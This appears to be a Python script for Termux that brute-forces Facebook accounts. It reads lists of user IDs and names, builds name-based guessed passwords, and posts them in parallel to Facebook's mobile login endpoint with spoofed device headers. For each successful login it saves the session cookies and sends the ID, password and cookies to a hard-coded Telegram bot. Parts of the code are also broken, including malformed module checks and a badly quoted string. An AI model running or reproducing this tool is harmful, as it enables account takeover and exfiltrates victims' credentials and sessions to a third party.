def modules():
    print('\x1b[37m •\x1b[38;5;196m ->\x1b[37m  REPOSITORY CHECK \x1b[37m')
    os.system('pkg update -y && pkg upgrade -y')
    os.system('clear')
    import requests
    if ModuleNotFoundError:
        print('\x1b[37m •\x1b[38;5;196m ->\x1b[37m REQUESTS IS BEING INSTALLED \x1b[37m')
        os.system('pip install requests --quiet')
        print('\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m REQUESTS HAS BEEN INSTALLED \x1b[37m')
    exit()
    import bs4
    if ModuleNotFoundError:
        print('\x1b[37m •\x1b[38;5;196m ->\x1b[37m BS4 IS BEING INSTALLED \x1b[37m')
        os.system('pip install bs4 --quiet')
        print('\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m BS4 HAS BEEN INSTALLED \x1b[37m')
    exit()
    import rich
    if ModuleNotFoundError:
        print('\x1b[37m •\x1b[38;5;196m ->\x1b[37m RICH IS BEING INSTALLED \x1b[37m')
        os.system('pip install rich --quiet')
        print('\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m RICH HAS BEEN INSTALLED \x1b[37m')
#━━━[ MODULE ]━━━#
import os,socket
os.system("pip install requests")
from time import sleep
import requests,json,time,re,random,sys,uuid,string,subprocess,zlib,base64,hashlib
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx
from string import *
from concurrent.futures import ThreadPoolExecutor as AISHA
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
#━━━[ COLOUR ]━━━#
GREEN="\33[38;5;46m"
WHITE="\33[1;97m"
RED="\33[1;91m"
BLUE="\33[1;94m"
CYAN="\33[1;96m"
X=f"{GREEN}[\33[1;91m~{GREEN}]"
os.system('apt update')
os.system('apt upgarde')
#━━━[ COUNTER ]━━━#
loop = 0
oks = []
cps = []
id = []
oks=[]
ck=[]
#━━━[ USER-AGENT ]━━━#
def RAKIB():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/VIVO;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
        return ua     
#━━━[ <<>> ]━━━#
line="\33[1;94m═"*40
logo = ("""
__________        .__               __           
\______   \_______|__|__  _______ _/  |_  ____   
 |     ___/\_  __ \  \  \/ /\__  \\   __\/ __ \  
 |    |     |  | \/  |\   /  / __ \|  | \  ___/  
 |____|     |__|  |__| \_/  (____  /__|  \___  > 
                                 \/          \/  
                                 
  """)         
#━━━[ LINE-X ]━━━#
sys.stdout.write('\x1b]2; MR~PYNUXXX \x07')
line=f"{BLUE}━"*40
X=f"{GREEN}[\33[1;91m~{GREEN}]"
def linex():print(line)
def clear():os.system("clear");print(logo)   
#━━━[ PASS-SYS ]━━━#
def PASS():
	clear()
	print(f"{GREEN}[\33[1;91mA{GREEN}] AUTO PASSWORD")
	print(f"{GREEN}[\33[1;91mB{GREEN}] CHOOSE PASSWORD");linex()
	passwo=input(f"{X} PASSWORD : ")
	if passwo in ["1","A"]:filexd()
	elif passwo in ["2","B"]:file()
	else:PASS()
#━━━[ FILE-AUTO ]━━━#
def file():
    clear()
    print(f"{X} EXAMPLE   {WHITE}:{CYAN} /sdcard/FILE.txt\33[1;94m")
    linex()
    file = input(f'{X} FILE PATH {WHITE}: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{X}{RED} FILE NOT FOUND........');time.sleep(2);PASS()
    plist=[]
    linex()
    try:
        ps_limit = int(input(f'{X} PASSWORD LIMIT {WHITE}: '))
    except:
        ps_limit =1
    linex()
    print(f"{X} EXAMPLE {WHITE}:{CYAN} first123 first1234");print(f"{X} EXAMPLE {WHITE}:{CYAN} first last firstlast");linex()
    for i in range(ps_limit):
        plist.append(input(f"{GREEN}[\33[1;91m{i+1}{GREEN}] PUT PASSWORD {WHITE}: "))
    with AISHA(max_workers=30) as Aisha:
        clear()
        tl = str(len(fo))
        print(f"{X} TOTAL ID{WHITE} :\33[38;5;46m {tl}")
        print(f"{X} IF NO RESULT ON/OFF AIRPLANE MODE");linex()
        for user in fo:
                    ids,names = user.split('|')
                    passlist = plist
                    Aisha.submit(m1,ids,names,passlist)
    exit()
#━━━[ FILE-CHOOSE ]━━━#
def filexd():
    clear()
    print(f"{X} EXAMPLE   {WHITE}:{CYAN} /sdcard/FILE.txt\33[1;94m")
    linex()
    file = input(f'{X} FILE PATH {WHITE}: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{X}{RED} FILE NOT FOUND........');time.sleep(2);PASS()
    plist=[]
    plist.append("@first@")
    plist.append("first@#@#")
    plist.append("first@123")
    plist.append("first123")
    plist.append("57273200")
    plist.append("first@@")
    plist.append("first@@@@")
    plist.append("first last")
    plist.append("firstlast123")
    plist.append("first last@@@@")
    plist.append("first####")
    plist.append("@@first@@")
    plist.append("first123@@@")
    with AISHA(max_workers=30) as Aisha:
        clear()
        tl = str(len(fo))
        print(f"{X} TOTAL ID{WHITE} :\33[38;5;46m {tl}")
        print(f"{X} IF NO RESULT ON/OFF AIRPLANE MODE");linex()
        for user in fo:
                    ids,names = user.split('|')
                    passlist = plist
                    Aisha.submit(m1,ids,names,passlist)
    exit()
#━━━[ METHOD-1 ]━━━#
def m1(ids,names,passlist):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r{GREEN}[\33[1;91mMR~PYNUXXX{GREEN}]{WHITE} =[%s|\33[38;5;46m%s{WHITE}]='%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            except:
                ls = fs
            for pw in passlist:
                pas = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',names).replace('name',names.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': RAKIB(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])          
                    print(f"\r\r{GREEN}[\33[1;91mMr-PYNUXXX-OK{GREEN}] {ids} | {GREEN}{pas}")
                    requests.get(f'''https://api.telegram.org/bot6991664095:AAHbgeRrBJwvSOMEn0VABLSs-aJR4vRZZ-U/sendMessage?chat_id=5326153007&text=[•] ids+'|'+pas+'|'+coki+'\n'''')
                    oks.append(ids)
                    open('/sdcard/MR.PYNUXXX-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:
            m1(ids,names,passlist)
PASS()